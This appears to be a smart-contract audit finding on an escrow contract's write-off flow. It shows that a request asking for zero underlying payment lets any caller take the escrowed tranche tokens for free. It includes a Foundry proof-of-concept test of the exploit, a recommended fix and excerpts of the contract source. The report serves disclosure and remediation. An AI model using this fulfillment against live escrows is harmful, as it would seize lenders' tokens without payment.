### Title
Zero-underlying write-off requests allow free seizure of escrowed tranche tokens - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](https://github.com/ThankGod76/idle-tranches--004/blob/main/contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`, creating an escrowed tranche offer whose required payment is zero. Because `fullfillWriteOffRequest` is callable by any wallet, an attacker can immediately take all escrowed tranche tokens without transferring underlying. This is analogous to accepting a zero count where later code assumes a nonzero value: the request exists, is treated as valid, and downstream fulfillment logic consumes it for free.

### Finding Description
`createWriteOffRequest` only validates `amount == 0` before transferring tranche tokens into escrow. [1](#0-0)  It then stores `underlyingsRequested` without requiring it to be positive and adds it to `pendingUnderlyings`. [2](#0-1) 

`fullfillWriteOffRequest` accepts a fulfillment when `_underlyings >= currentRequest.underlyings`; for a zero-underlying request, `_underlyings == 0` satisfies that check. [3](#0-2)  The function then transfers zero underlyings, sends zero proceeds/fee, and transfers the entire escrowed `_tranches` amount to the fulfiller. [4](#0-3)  The function is explicitly callable by any wallet. [5](#0-4) 

The intended economic invariant is that an escrowed tranche position is exchanged for the requested underlying amount. A zero-required-payment request breaks that invariant: the contract treats a malformed free-giveaway order as a valid sale, then enforces it faithfully.

### Impact Explanation
A lender who accidentally submits `underlyingsRequested = 0` permanently loses the full escrowed tranche position to the first fulfiller, while receiving no underlying payment. The attacker only needs to be an EOA or contract capable of calling `fullfillWriteOffRequest`; borrower privileges are not required.

The direct loss is the entire `amount` passed to `createWriteOffRequest`. For example, escrowed `10_000e18` tranche tokens can be extracted with a payment of `0` underlying. The attacker can choose `_underlyings = 0`, so the fulfillment's safe transfer, fee calculation, and seller payout all move no underlying, while `_tranches` is still paid out. [4](#0-3) 

### Likelihood Explanation
Likelihood is limited by the precondition that a lender submits a request with a zero underlying price during a running epoch. That is a realistic parameter typo or frontend/API error rather than a privileged action: any tranche holder can call `createWriteOffRequest` while the epoch is running. [1](#0-0) 

Once such a request exists, exploitation is permissionless and immediate because fulfillment is not restricted to the borrower or another trusted party. [6](#0-5)  Existing checks do not prevent it: `EpochNotRunning` only gates creation, `NotAllowed` only checks tranche count, `Is0` checks whether a request exists, and `WrongRequest` permits any payment at or above the requested amount. [7](#0-6) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, matching the existing nonzero tranche validation:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

As defense in depth, `fullfillWriteOffRequest` can also reject `currentRequest.underlyings == 0` so legacy malformed requests cannot be fulfilled at zero price; affected lenders would still be able to recover their tranche tokens through `deleteWriteOffRequest`. [8](#0-7) 

### Proof of Concept
This Foundry test follows the setup and request flow used by `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, including the existing assertions that `createWriteOffRequest(0, 1e6)` reverts while nonzero tranche requests are accepted. [9](#0-8) 

```solidity
// test/foundry/IdleCreditVaultWriteOffEscrow.t.sol
function testZeroUnderlyingRequestCanBeFulfilledForFree() external {
    address attacker = makeAddr("attacker");
    uint256 requestedTranches = 10000e18;

    uint256 sellerTrancheBefore = tranche.balanceOf(LP);
    uint256 sellerUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerTrancheBefore = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

    // Lender creates a malformed request with a nonzero tranche escrow but
    // zero required underlying payment.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, requestedTranches);
    assertEq(underlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    // Any EOA can fulfill. _underlyings == 0 passes:
    // require(_underlyings >= currentRequest.underlyings)
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    (tranches, underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0);
    assertEq(underlyings, 0);

    // Attacker receives all escrowed tranches and pays nothing.
    assertEq(tranche.balanceOf(attacker) - attackerTrancheBefore, requestedTranches);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);

    // Seller's tranche tokens are gone and no underlying proceeds were received.
    assertEq(sellerTrancheBefore - tranche.balanceOf(LP), requestedTranches);
    assertEq(underlying.balanceOf(LP), sellerUnderlyingBefore);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-135)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L137-151)
```text
    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L120-145)
```text
  function testCreateWriteOffRequest() external {
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    escrow.createWriteOffRequest(0, 1e6);

    uint256 trancheBalancePre = tranche.balanceOf(LP);
    vm.prank(LP);
    escrow.createWriteOffRequest(10000e18, 10000e6); // 10k tranche tokens and 10k USDC requested
    uint256 trancheBalancePost = tranche.balanceOf(LP);
    assertEq(trancheBalancePre - trancheBalancePost, 10000e18, 'tranche balance of LP is wrong after write-off request');
    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 10000e18, 'write-off request tranches is wrong');
    assertEq(underlyings, 10000e6, 'write-off request underlyings is wrong');
    assertEq(escrow.pendingUnderlyings(), 10000e6, 'pending underlyings is wrong after first request');

    // create another request
    vm.prank(LP);
    escrow.createWriteOffRequest(10000e18, 10000e6);
    (tranches, underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 20000e18, 'write-off request tranches is wrong after second request');
    assertEq(underlyings, 20000e6, 'write-off request underlyings is wrong after second request');
    assertEq(escrow.pendingUnderlyings(), 20000e6, 'pending underlyings is wrong after second request');

    _stopCurrentEpoch();
    vm.expectRevert(abi.encodeWithSelector(EpochNotRunning.selector));
    escrow.createWriteOffRequest(0, 1e6);
  }
```
